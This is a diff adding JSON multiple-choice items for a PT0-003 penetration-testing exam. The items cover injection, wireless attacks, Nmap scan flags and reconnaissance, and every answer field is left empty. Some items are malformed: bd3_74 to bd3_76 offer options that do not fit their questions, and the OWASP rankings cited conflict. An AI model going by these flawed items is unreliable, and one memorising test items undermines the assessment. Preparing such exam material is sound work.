+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_16",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a web application penetration test, you have identified a command injection vulnerability that allows for arbitrary code execution. Which of the following is the MOST effective way to prevent command injection attacks?",
+      "options": [
+        "A. Password complexity requirements",
+        "B. Input validation and sanitization",
+        "C. Firewalls and intrusion detection systems (IDS)",
+        "D. Multi-factor authentication (MFA)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_17",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security analyst is performing a penetration test on an e-commerce website. During the test, the analyst identifies a parameter that is vulnerable to SQL injection. The analyst decides to use a Boolean SQL attack to extract sensitive data from the database. What is the primary benefit of using a Boolean SQL attack in this scenario?",
+      "options": [
+        "A. It allows the analyst to extract data in a single query",
+        "B. It provides a complete dump of the entire database",
+        "C. It bypasses security controls that detect traditional SQL injection attacks",
+        "D. It executes the query in a way that is faster and less detectable than traditional SQL injection"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_18",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration test, you found a web application that is vulnerable to Blind SQL injection. Which of the following is a possible consequence of a successful Blind SQL injection attack?",
+      "options": [
+        "A. The attacker can view the source code of the application",
+        "B. The attacker can gain unauthorized access to the database",
+        "C. The attacker can modify the database schema",
+        "D. The attacker can overwrite the application's configuration file"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_19",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a pen tester, you are performing a security assessment of a company’s web application. During the testing, you find a field that takes user input and is vulnerable to Blind SQL injection. What is the main difference between Blind SQL injection and regular SQL injection?",
+      "options": [
+        "A. Blind SQL injection does not require authentication",
+        "B. Blind SQL injection can only retrieve one record at a time",
+        "C. Blind SQL injection does not display errors or results",
+        "D. Blind SQL injection can only modify the database structure"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_20",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a penetration tester, you are attempting to exploit a web application to perform a server-side request forgery attack. Which of the following would be the most effective technique to accomplish this?",
+      "options": [
+        "A. Sending a specially crafted GET request with a malicious URL parameter",
+        "B. Manipulating cookies to redirect requests to a different server",
+        "C. Using a SQL injection attack to access the server's internal network",
+        "D. Fuzzing input fields to inject malicious code"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_21",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing an assessment on a web application and discovers that an attacker can execute arbitrary code in the application by manipulating a particular input field. This vulnerability is ranked number three on the OWASP Top 10 list. Which of the following vulnerabilities is the tester most likely referring to?",
+      "options": [
+        "A. Broken Authentication and Session Management",
+        "B. Injection Flaws",
+        "C. Cross-Site Scripting (XSS)",
+        "D. Insecure Direct Object References"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_22",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked with assessing the security of an e-commerce website. During the assessment, the tester discovers that the website is vulnerable to a particular type of attack that is ranked number one on the OWASP Top 10 list. Which of the following attacks is the tester most likely referring to?",
+      "options": [
+        "A. Broken Authentication and Session Management",
+        "B. Cross-Site Scripting (XSS)",
+        "C. Injection Flaws",
+        "D. Security Misconfiguration"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_23",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "What type of attack could be performed using an amplified antenna?",
+      "options": [
+        "A. Packet injection attack",
+        "B. Deauthentication attack",
+        "C. Rogue access point attack",
+        "D. Brute force attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_24",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "While conducting a wireless penetration test, you find a target access point that is using the WPA2-PSK encryption. However, you were able to capture a four-way handshake between a client and the access point. What tool can you use to crack the pre-shared key (PSK)?",
+      "options": [
+        "A. Wireshark",
+        "B. Aircrack-ng",
+        "C. John the Ripper",
+        "D. THC Hydra"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_25",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have been hired to perform a penetration test on a retail store’s security system that uses RFID tags. Which of the following best describes RFID cloning?",
+      "options": [
+        "A. The act of intercepting RFID transmissions to steal confidential data",
+        "B. The process of copying an existing RFID tag's unique identifier to a new tag",
+        "C. The unauthorized access to an RFID-enabled system",
+        "D. The alteration of an RFID tag's data to corrupt its operation"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_26",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As a security analyst, you are tasked with testing the security of a company’s Bluetooth-enabled devices. You discover that an attacker can gain access to sensitive data on a device, including contacts, text messages, and images, by using Bluesnarfing. Which of the following statements BEST describes Bluesnarfing?",
+      "options": [
+        "A. It is an attack that steals sensitive information by intercepting Bluetooth transmissions",
+        "B. It is an attack that allows the attacker to hijack the Bluetooth connection and control the device",
+        "C. It is an attack that floods the target device with so many Bluetooth requests that it crashes",
+        "D. It is an attack that creates a fake Bluetooth access point to steal sensitive information"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_27",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As part of your wireless assessment, you notice that a nearby device is attempting to send unsolicited messages to your phone. After investigating, you find that the device is utilizing the Bluetooth protocol to transmit these messages. What type of wireless attack is this MOST likely an example of?",
+      "options": [
+        "A. Bluejacking",
+        "B. Evil twin",
+        "C. Rogue access point",
+        "D. Deauthentication"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_28",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are conducting a wireless penetration test for a client who has implemented a captive portal for user authentication. You discover that the captive portal is vulnerable to a cross-site scripting (XSS) attack. What could an attacker do with this vulnerability?",
+      "options": [
+        "A. Bypass the captive portal authentication",
+        "B. Steal user credentials entered into the captive portal",
+        "C. Redirect users to a malicious website",
+        "D. Execute arbitrary code on the captive portal server"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_29",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have been hired to perform a wireless security assessment of a company’s network. While scanning the network, you notice two access points with the same SSID. You try to connect to both of them, but only one has internet connectivity. Which type of attack is being executed by the malicious actor?",
+      "options": [
+        "A. Deauthentication attack",
+        "B. MAC spoofing attack",
+        "C. Evil twin attack",
+        "D. Rogue access point attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_30",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company has implemented a wireless network with a strong password and encryption method. However, the security team is concerned about de-authentication attacks on the network. Which of the following is a defense mechanism that can be implemented to mitigate the risks of de-authentication attacks?",
+      "options": [
+        "A. Network Segmentation",
+        "B. MAC Address Filtering",
+        "C. Wireless Intrusion Detection Systems (WIDS)",
+        "D. Virtual Private Networks (VPNs)"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_31",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been asked to perform a vulnerability scan on a target system that has a large number of ports and services. The tester wants to identify all available vulnerabilities, including those that are not included in the default Nmap scripts. Which Nmap command should the tester use with the vulnerability scanning feature in this scenario?",
+      "options": [
+        "A. nmap -sS",
+        "B. nmap -sU –top-ports 1000 –script vuln",
+        "C. nmap -sV –version-all –script vuln",
+        "D. nmap -sV –allports –script vuln"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_32",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been asked to perform a scan of a target network to identify vulnerabilities. The tester is concerned about potentially causing network congestion and wants to perform a scan that is relatively safe and reliable. Which timing template should the tester use with the Nmap command?",
+      "options": [
+        "A. -T0",
+        "B. -T2",
+        "C. -T4",
+        "D. -T5"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_33",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked with performing a vulnerability scan on a client’s network. The tester wants to perform a stealthy scan that avoids detection by the client’s intrusion detection system (IDS). Which command should the tester use to perform this scan?",
+      "options": [
+        "A. Nmap -sT",
+        "B. Nmap -sS",
+        "C. Nmap -sA",
+        "D. Nmap -sN"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_34",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, you are tasked with identifying open UDP ports on the target network. Which Nmap scan option is most appropriate for this task?",
+      "options": [
+        "A. Nmap -sn",
+        "B. Nmap -sS",
+        "C. Nmap -sU",
+        "D. Nmap -sT"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_35",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security analyst has been tasked with identifying the operating system of a target system. The analyst is not authorized to perform any disruptive scans that may crash the system. Which Nmap option should the analyst use?",
+      "options": [
+        "A. Nmap -sS",
+        "B. Nmap -sT",
+        "C. Nmap -O",
+        "D. Nmap -sP"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_36",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is conducting a vulnerability scan on a target network. The tester has reason to believe that the network’s firewall is configured to drop all packets from unknown hosts. Which of the following Nmap options should the tester use to avoid being detected?",
+      "options": [
+        "A. Nmap -sT",
+        "B. Nmap -Pn",
+        "C. Nmap -sS",
+        "D. Nmap -sU"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_37",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, the tester is tasked with scanning a client’s web server for open ports and potential vulnerabilities. The tester wants to determine the service versions running on each port to identify any known vulnerabilities. Which Nmap scan should the tester perform?",
+      "options": [
+        "A. Nmap -sS",
+        "B. Nmap -sP",
+        "C. Nmap -sU",
+        "D. Nmap -sV"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_38",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked with scanning a target network for potential vulnerabilities. The tester wants to get more information about the open ports and services running on the target systems. Which of the following Nmap scan options should the tester use?",
+      "options": [
+        "A. Nmap -sS",
+        "B. Nmap -sT",
+        "C. Nmap -sU",
+        "D. Nmap -sV"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_39",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are conducting a vulnerability scan on a target network and want to perform an in-depth scan that includes tracing the path to the target system, checking for open ports, and identifying the operating system and software versions. However, you want to avoid overloading the target system with traffic. Which Nmap option should you use?",
+      "options": [
+        "A. Nmap -sS",
+        "B. Nmap -sT",
+        "C. Nmap -O",
+        "D. Nmap -A"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_40",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, you have been asked to conduct a thorough scan of the target network to identify vulnerabilities. You need to perform a scan that combines OS detection, version detection, script scanning, and traceroute information. Which of the following Nmap commands should you use?",
+      "options": [
+        "A. Nmap -sS",
+        "B. Nmap -sU",
+        "C. Nmap -O",
+        "D. Nmap -A"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_41",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, you are tasked with identifying vulnerabilities in a target network. Which of the following Nmap Scripting Engine (NSE) scripts would be the best option to identify web application vulnerabilities?",
+      "options": [
+        "A. http-enum.nse",
+        "B. smb-vuln-ms17-010.nse",
+        "C. ssl-heartbleed.nse",
+        "D. ssh-hostkey.nse"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_42",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have been tasked with performing a vulnerability scan on a web server. The server is running an HTTP service on port 80, HTTPS on port 443, and SSH on port 22. Your scan should be as stealthy as possible, so as to not trigger any security alerts. Which of the following scans should you use?",
+      "options": [
+        "A. UDP scan",
+        "B. TCP SYN scan",
+        "C. TCP connect scan",
+        "D. XMAS scan"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_43",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is conducting a vulnerability scan of a large network with multiple firewalls and intrusion detection systems in place. The tester wants to avoid triggering any alarms or alerts during the scan. Which scanning technique should the tester use to minimize the risk of detection?",
+      "options": [
+        "A. Ping sweep",
+        "B. Xmas scan",
+        "C. Syn scan",
+        "D. Stealth scan"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_44",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has been hired by a company to perform a vulnerability scan of their network. The company has strict policies against disrupting network traffic and systems during business hours. Which scanning technique should the tester use to minimize the impact on the network and avoid detection?",
+      "options": [
+        "A. Ping scan",
+        "B. TCP connect scan",
+        "C. UDP scan",
+        "D. Stealth scan"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_45",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is conducting a vulnerability scan on a network that includes several different subnets connected by routers. The penetration tester has configured the scanner to use various protocols, including ICMP, TCP, and UDP. The tester has also selected a range of ports to scan. What is the primary reason for selecting specific protocols and ports during a vulnerability scan?",
+      "options": [
+        "A. To ensure that all assets on the network are scanned thoroughly",
+        "B. To optimize the scan for speed and efficiency",
+        "C. To minimize the impact of the scan on the network and its assets",
+        "D. To identify vulnerabilities that are specific to the target assets and protocols"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_46",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is conducting a vulnerability scan on a client’s network. The network topology is complex and includes multiple subnets, firewalls, and routers. The penetration tester has access to the client’s network diagram and IP addressing scheme. What is the MOST important consideration for the penetration tester when conducting a vulnerability scan in this scenario?",
+      "options": [
+        "A. Ensuring that the scanner is compatible with the client's network diagram and IP addressing scheme",
+        "B. Configuring the scanner to use the correct scanning techniques for the client's network topology",
+        "C. Obtaining permission from the client's network administrator before conducting the scan",
+        "D. Identifying the boundaries and scope of the scan based on the client's network diagram and IP addressing scheme"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_47",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company is performing a vulnerability scan on its network using a popular vulnerability scanning tool. During the scan, the tool reports that it is unable to connect to certain network devices. Which protocol might be the cause of this issue?",
+      "options": [
+        "A. TCP",
+        "B. UDP",
+        "C. SNMP",
+        "D. ICMP"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_48",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "Which of the following protocols can be used for vulnerability scanning to identify open ports and services running on a target system?",
+      "options": [
+        "A. HTTPS",
+        "B. SMTP",
+        "C. FTP",
+        "D. TCP"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_49",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "What is the main consideration when scheduling vulnerability scans?",
+      "options": [
+        "A. Network availability",
+        "B. Time to run scans",
+        "C. Data collection",
+        "D. Vulnerability identification"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_50",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security analyst is analyzing the output from the web server logs of a company’s website. She notices that there have been several requests for a specific file that does not exist on the server. What is the MOST likely reason for these requests?",
+      "options": [
+        "A. A vulnerability scanner is attempting to exploit a known vulnerability in the web server software",
+        "B. A script kiddie is attempting to gain unauthorized access to the company's network",
+        "C. An attacker is trying to identify weaknesses in the web server's configuration",
+        "D. A legitimate user is attempting to access the file"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_51",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A security analyst is analyzing the output from the web server logs of a company’s website. She notices that there have been several requests for a specific directory that contains sensitive information. What is the MOST likely reason for these requests?",
+      "options": [
+        "A. A vulnerability scanner is attempting to exploit a known vulnerability in the web server software",
+        "B. A script kiddie is attempting to gain unauthorized access to the company's network",
+        "C. An attacker is trying to identify weaknesses in the web server's configuration",
+        "D. A legitimate user is attempting to access the directory"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_52",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are analyzing the output from an Nmap scan and notice that there are several ports marked as filtered. What does this indicate?",
+      "options": [
+        "A. The ports are open and accepting connections",
+        "B. The ports are closed and not accepting connections",
+        "C. The firewall is blocking traffic to those ports",
+        "D. The ports are not active on the network"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_53",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are conducting a Penetration Testing exercise on a company’s network. You decide to use Nmap to scan for open ports and services on the network. After the scan, you see that there is an open port for SSH. What can you infer from this information?",
+      "options": [
+        "A. The company uses SSH to remotely manage devices",
+        "B. The company uses Telnet to remotely manage devices",
+        "C. The company does not use remote device management tools",
+        "D. The port is open but cannot be used for remote management"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_54",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "As part of a reconnaissance exercise, you capture ARP traffic on a network and analyze it to map the network topology. You notice that the same MAC address is associated with multiple IP addresses, and some IP addresses are associated with multiple MAC addresses. What could this indicate?",
+      "options": [
+        "A. The network is running a load-balancing protocol",
+        "B. The network is using virtualization or containerization technologies",
+        "C. The network is suffering from IP address conflicts",
+        "D. The network is using a rogue DHCP server"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_55",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration test, you captured network traffic using a packet sniffer tool. While analyzing the captured packets, you observe that there is a high amount of traffic to a specific IP address, which was not identified during the initial reconnaissance. What could be the reason for this?",
+      "options": [
+        "A. The IP address belongs to a newly added server on the network",
+        "B. The IP address belongs to a rogue device on the network",
+        "C. The IP address belongs to a load balancer on the network",
+        "D. The IP address belongs to a DNS server on the network"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_56",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a penetration testing engagement, you capture ARP traffic on a network. After analyzing the traffic, you notice a large number of ARP packets originating from the same IP address, but with different MAC addresses. What could this indicate?",
+      "options": [
+        "A. The IP address is a rogue device attempting to spoof its MAC address",
+        "B. The MAC addresses belong to different network interface cards on the same device",
+        "C. The IP address is a legitimate device with a misconfigured network interface",
+        "D. The MAC addresses belong to different devices on the network"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_57",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You have been hired to perform a web application penetration testing on a new e-commerce website. You begin your reconnaissance by crawling the website and identifying links to its subdomains. You notice a subdomain with a different naming convention than the rest and want to investigate it further. What technique can be used to fingerprint the subdomain’s underlying technology?",
+      "options": [
+        "A. OS fingerprinting",
+        "B. Service version identification",
+        "C. Banner grabbing",
+        "D. WAF fingerprinting"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_58",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a web application penetration testing, which of the following information can be gathered by crawling a website?",
+      "options": [
+        "A. List of open ports on the web server",
+        "B. List of software installed on the web server",
+        "C. Links to subdomains and other websites",
+        "D. Passwords of the web application users"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_59",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are performing a reconnaissance exercise on a target organization and notice that they have a publicly accessible DNS server. Which of the following types of information can you gather from the DNS server?",
+      "options": [
+        "A. Employee email addresses",
+        "B. System logs",
+        "C. Domain names and IP addresses",
+        "D. Network topology maps"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_60",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a reconnaissance exercise, you performed a DNS lookup on a target website and found multiple IP addresses. Which of the following is a possible reason for multiple IP addresses?",
+      "options": [
+        "A. DNS spoofing",
+        "B. Load balancing",
+        "C. Website defacement",
+        "D. Man-in-the-middle attack"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_61",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing reconnaissance on a target network to identify its operating systems, services, and applications. During the fingerprinting process, the tester discovers that the network devices use a unique TCP/IP stack implementation that is uncommon in most operating systems. What is the MOST likely conclusion that can be drawn from this finding?",
+      "options": [
+        "A. The network devices are likely using a custom operating system",
+        "B. The network devices are running an outdated version of an operating system",
+        "C. The network devices are likely using a modified version of a commonly used operating system",
+        "D. The network devices are running a virtualized operating system"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_62",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has conducted a reconnaissance exercise against a target system and has identified the operating system running on the target. Which of the following tools would be MOST useful for conducting further analysis on the target operating system?",
+      "options": [
+        "A. Wireshark",
+        "B. Metasploit",
+        "C. Nmap",
+        "D. Netcat"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_63",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester has conducted a reconnaissance exercise against a target system and has gathered information about the target operating system. Which of the following pieces of information is the MOST useful to the tester in identifying potential vulnerabilities?",
+      "options": [
+        "A. The version number of the operating system",
+        "B. The number of users on the system",
+        "C. The amount of free disk space on the system",
+        "D. The number of running processes on the system"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_64",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In order to avoid detection by an intrusion detection system (IDS), an attacker wants to make the traffic look like legitimate traffic. Which of the following techniques should the attacker use?",
+      "options": [
+        "A. Fragmentation",
+        "B. Port scanning",
+        "C. Banner grabbing",
+        "D. Vulnerability scanning"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_65",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "In a penetration testing engagement, you have been tasked with identifying all cloud assets owned by a company. Which of the following methods would you use to perform cloud asset discovery?",
+      "options": [
+        "A. Port scanning",
+        "B. DNS enumeration",
+        "C. Cloud metadata service interrogation",
+        "D. Nmap scanning"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_66",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing an assessment on a cloud-based application. Which of the following is the BEST method to identify the cloud provider and the hosting location of the application?",
+      "options": [
+        "A. Performing a WHOIS lookup",
+        "B. Scanning the IP address of the application",
+        "C. Checking the HTTP response headers of the application",
+        "D. Checking the domain name system (DNS) records of the application"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_67",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is conducting an active reconnaissance on a target network. The tester wants to gather information about the network topology and services running on the network. Which of the following techniques should the tester use?",
+      "options": [
+        "A. SQL injection",
+        "B. Social engineering",
+        "C. Packet sniffing",
+        "D. XSS"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_68",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are a penetration tester tasked with testing the security of a company’s web application. You have been asked to capture the API requests and responses that are being sent to and from the server. Which of the following tools would you use for this purpose?",
+      "options": [
+        "A. tcpdump",
+        "B. traceroute",
+        "C. netstat",
+        "D. nmap"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_69",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing an assessment of a client’s network infrastructure. The tester has already performed a thorough scan of the wired network and has identified all devices connected to it. The tester now wants to identify any wireless access points that may be connected to the same network. Which of the following techniques should the tester use?",
+      "options": [
+        "A. Banner grabbing",
+        "B. Wardriving",
+        "C. Social engineering",
+        "D. Port scanning"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_70",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is tasked to perform an active reconnaissance of a targeted organization. The organization’s wireless network has already been secured with WPA2, but the tester wants to determine if there are any unauthorized access points in the area. Which of the following techniques should the tester use to perform this task?",
+      "options": [
+        "A. DNS zone transfers",
+        "B. Ping sweep",
+        "C. Traceroute",
+        "D. Wardriving"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_71",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "During a wardriving exercise, you detect an access point that is not part of the company’s wireless network. What type of attack could the rogue access point be used for?",
+      "options": [
+        "A. MAC spoofing",
+        "B. Social engineering",
+        "C. Rogue access point",
+        "D. Evil twin"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_72",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A company has implemented token-based authentication for its web application. During a penetration test, you discover that an attacker can reuse an old token to gain unauthorized access to the application. What is the best approach to mitigate this vulnerability?",
+      "options": [
+        "A. Increase the token's expiry time",
+        "B. Implement token revocation",
+        "C. Decrease the token's size",
+        "D. Implement multi-factor authentication"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_73",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing active reconnaissance on a web application to identify potential vulnerabilities. During the testing, the tester finds a token that is being used to authenticate users. Which of the following is the BEST course of action for the tester?",
+      "options": [
+        "A. Use the token to access the application and gain more information about the system",
+        "B. Attempt to crack the token to gain administrative access to the system",
+        "C. Use the token to conduct a brute force attack on the system",
+        "D. Report the finding to the appropriate personnel"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_74",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a cloud penetration test on a client’s Azure environment and needs to identify any weak passwords that could be exploited by attackers. The tester needs a tool that can brute-force user accounts and report on any weak passwords found. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Social engineering",
+        "B. Packet crafting",
+        "C. Port scanning",
+        "D. Reverse engineering"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_75",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "A penetration tester is performing a cloud penetration test on a client’s AWS environment and needs to identify any misconfigurations in the cloud infrastructure that could be exploited by attackers. The tester needs a tool that can scan the environment for misconfigurations and report on any vulnerabilities found. Which of the following tools would BEST fit this need?",
+      "options": [
+        "A. Banner grabbing",
+        "B. Packet crafting",
+        "C. Protocol analysis",
+        "D. Parameter fuzzing"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_76",
+      "exam": "PT0-003",
+      "type": "multiple_choice",
+      "question": "You are tasked with performing a vulnerability scan on a target network to identify the operating system running on a target host. The target host is known to be running a very old and insecure operating system that is no longer supported by the vendor. The target host is responding to ICMP echo requests. Type the nmap command to perform the scan.",
+      "options": [
+        "A. Arachni",
+        "B. Hping",
+        "C. Nmap",
+        "D. WhatWeb"
+      ],
+      "correct_answer": "",
+      "explanation": "",
+      "domain": ""
+    },
+    {
+      "id": "bd3_77",
